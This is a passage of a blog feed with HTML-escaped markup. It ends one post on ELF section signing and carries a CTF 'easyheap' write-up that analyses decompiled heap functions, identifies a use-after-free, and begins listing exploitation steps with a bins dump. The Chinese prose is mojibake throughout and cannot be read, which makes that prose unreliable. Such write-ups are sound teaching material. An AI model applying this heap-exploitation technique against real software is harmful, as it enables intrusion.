    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;err_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Write .text hash failed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è¿™é‡Œçš„ç­¾åå³éªŒè¯ç®—æ³•32/64ä½çš„ç¨‹åºåŸç†ç±»ä¼¼ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°ã€‚&lt;/p&gt;

&lt;h2 id=&quot;0x04-æ€»ç»“&quot;&gt;0x04 æ€»ç»“&lt;/h2&gt;

&lt;p&gt;â€ƒâ€ƒè¯¥é¡¹ç›®çš„å®ç°ä¸»è¦éœ€è¦ç†Ÿæ‚‰ELFçš„æ–‡ä»¶æ ¼å¼ï¼Œå®é™…ä¸Šè¿™ç§æ–°å»ºsectionçš„æŠ€æœ¯è¢«å¹¿æ³›ç”¨äºè½¯ä»¶æ±‰åŒ–ï¼Œå› ä¸ºéœ€è¦å‚¨å­˜ä¸­æ–‡å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ç»å¸¸å°†æ±‰åŒ–æ•°æ®å­˜å…¥soæ–‡ä»¶çš„æ–°çš„sectionä¸­ã€‚æˆ‘æœ¬äººå‹‰å¼ºç®—äº†è§£é€†å‘å·¥ç¨‹çš„ç›¸å…³æŠ€æœ¯ï¼Œæ‰€ä»¥æ¯”è¾ƒç†Ÿæ‚‰ELFæ–‡ä»¶çš„æ ¼å¼ã€‚è‡³äºå†…æ ¸æ¨¡å—çš„HookæŠ€æœ¯ï¼Œæˆ‘ä¹‹å‰åªå°è¯•è¿‡ç”¨æˆ·æ€çš„hookï¼Œä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨&lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace&lt;/code&gt;ï¼Œè¿™æ¬¡ä¹Ÿå°è¯•äº†ä¸€ä¸‹æ–°çš„æ–¹æ³•ï¼Œ&lt;strong&gt;Kui&lt;/strong&gt;çš„å…·ä½“åŸç†è¯·è§å…¶ç›¸å…³æ–‡æ¡£ã€‚&lt;/p&gt;</content><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><category term="Project" /><summary type="html">0x01 é¡¹ç›®ç®€ä»‹</summary></entry><entry><title type="html">é«˜æ ¡æˆ˜å½¹easyheap</title><link href="http://localhost:4000/blog/easyheap" rel="alternate" type="text/html" title="é«˜æ ¡æˆ˜å½¹easyheap" /><published>2020-04-06T00:00:00+08:00</published><updated>2020-04-06T00:00:00+08:00</updated><id>http://localhost:4000/blog/easyheap</id><content type="html" xml:base="http://localhost:4000/blog/easyheap">&lt;p&gt;â€ƒâ€ƒåˆ·é¢˜è¿‡å°‘ï¼Œå¯¼è‡´çœ‹èµ·æ¥ååˆ†ç®€å•çš„é¢˜ç›®å½“æ—¶æ— ä»ä¸‹æ‰‹ã€‚æ²¡åŠæ³•ï¼Œè¿˜æ˜¯è¦å¤šåˆ·é¢˜æ‰¾æ‰‹æ„Ÿã€‚ä»Šå¤©æƒ³èµ·æ¥ä¸Šæ¬¡easyheapæ²¡æ•´ç†ï¼Œè¶æœºå­¦ä¹ ä¸€æ³¢ï¼Œçœ‹äº†ä¸€ä¸‹æ€è·¯ï¼Œæœç„¶æ²¡ä»€ä¹ˆæ–°çš„åˆ©ç”¨ç‚¹ï¼Œå°±æ˜¯å½“æ—¶æ¼æ´ç‚¹æ²¡å‘ç°ã€‚&lt;/p&gt;

&lt;h3 id=&quot;äºŒè¿›åˆ¶åˆ†æ&quot;&gt;äºŒè¿›åˆ¶åˆ†æ&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;â€ƒâ€ƒè¿™ä¸ªbinaryåªæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;add_message&lt;/li&gt;
  &lt;li&gt;delete_message&lt;/li&gt;
  &lt;li&gt;edit_message&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä¸‹é¢åˆ†æä¸€ä¸‹å…·ä½“ç»†èŠ‚ï¼š
ç¬¬ä¸€ä¸ªå°±æ˜¯æ·»åŠ ä¸€ä¸ªmessageç»“æ„ä½“ï¼Œé•¿ä¸‹é¢è¿™æ ·:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 message         struc ; (sizeof=0x10, mappedto_6)
00000000 content_ptr     dq ?
00000008 size            dd ?
0000000C padding         dd ?
00000010 message         ends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç„¶åæ£€æŸ¥ä¸€ä¸‹sizeåå°±ä¼šåˆ†é…nbyteså¤§å°çš„ç©ºé—´ï¼Œå­˜åˆ°content_ptré‚£é‡Œï¼Œå‡å¦‚nbytesçš„å¤§å°å¤§äº1024çš„è¯å°±ä¼šç”³è¯·å¤±è´¥ï¼Œä½†æ˜¯&lt;code class=&quot;highlighter-rouge&quot;&gt;ptr[i]&lt;/code&gt;å´å·²ç»åˆ†é…è¿‡äº†ï¼Œreturnä¹‹å‰å´æ²¡æœ‰freeæ‰ã€‚æ‰€ä»¥è¿™é‡Œä¾¿æ˜¯æ¼æ´çš„å…³é”®ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add_message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rbx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+8h] [rbp-18h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+Ch] [rbp-14h]&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Too many items!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;How long is this message?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;nbytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Too much size!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What is the content of the message?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Add successfully.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;deleteå°±æ˜¯åˆ é™¤ä¸¤ä¸ªchunkï¼Œä½†æ˜¯sizeå¹¶æ²¡æœ‰è®¾ç½®ä¸º0,åˆæ˜¯ä¸ªæ¼æ´&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;delete_message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delete_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete failed.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What is the index of the item to be deleted?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete failed.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete successfully.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;editå°±æ˜¯å¯ä»¥é‡å†™sizeä¸ªbyteçš„å†…å®¹åˆ°contenté‡Œ&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;edit_message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete failed.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What is the index of the item to be modified?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Edit failed.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What is the content of the message?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Edit successfully.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;åˆ©ç”¨æ€è·¯&quot;&gt;åˆ©ç”¨æ€è·¯&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;å…¶å®åˆ©ç”¨æ–¹æ³•ä¸Šä¹Ÿæ²¡æœ‰å•¥æ–°çš„èŠ±æ ·ï¼Œæ— éæ˜¯æƒ³åŠæ³•æ„é€ ä»»æ„å†™ï¼Œç”±äºåˆ·é¢˜è¿‡å°‘å¯¼è‡´æ ¹æœ¬æ²¡æœ‰æ€è·¯â€¦&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;é¦–å…ˆåˆ†é…0x20, 0x80, 0x20ä¸‰ä¸ªmessage&lt;/li&gt;
  &lt;li&gt;ç„¶åfreeæ‰0 1ï¼Œæ­¤æ—¶binsæ„é€ å¦‚ä¸‹ï¼š
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fastbins
0x20: 0x119e050 â€”â–¸ 0x119e000 â—‚â€” 0x0
0x30: 0x119e020 â—‚â€” 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x119e070 â€”â–¸ 0x7f0a19860b78 (main_arena+88) â—‚â€” 0x119e070
smallbins
empty
largebins
empty
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;addä¸€ä¸ª0x401çš„messageï¼Œå¯¼è‡´åˆ†é…å¤±è´¥ï¼Œæ­¤æ—¶&lt;code class=&quot;highlighter-rouge&quot;&gt;ptr[0]&lt;/code&gt;ä¸­ä¾¿æ˜¯&lt;code class=&quot;highlighter-rouge&quot;&gt;0x119e050&lt;/code&gt;ï¼Œè¿™é‡Œæ¯”è¾ƒéªšçš„æ˜¯&lt;code class=&quot;highlighter-rouge&quot;&gt;ptr[0]-&amp;gt;content_ptr == 0x119e000&lt;/code&gt;ï¼Œå› ä¸º&lt;code class=&quot;highlighter-rouge&quot;&gt;ptr[0]&lt;/code&gt;çš„fdæŒ‡é’ˆä»æŒ‡å‘å‰ä¸€ä¸ªchunkï¼Œå½¢æˆuafã€‚å¹¶ä¸”&lt;code class=&quot;highlighter-rouge&quot;&gt;ptr[0]-&amp;gt;size == 0x80&lt;/code&gt;&lt;/li&gt;
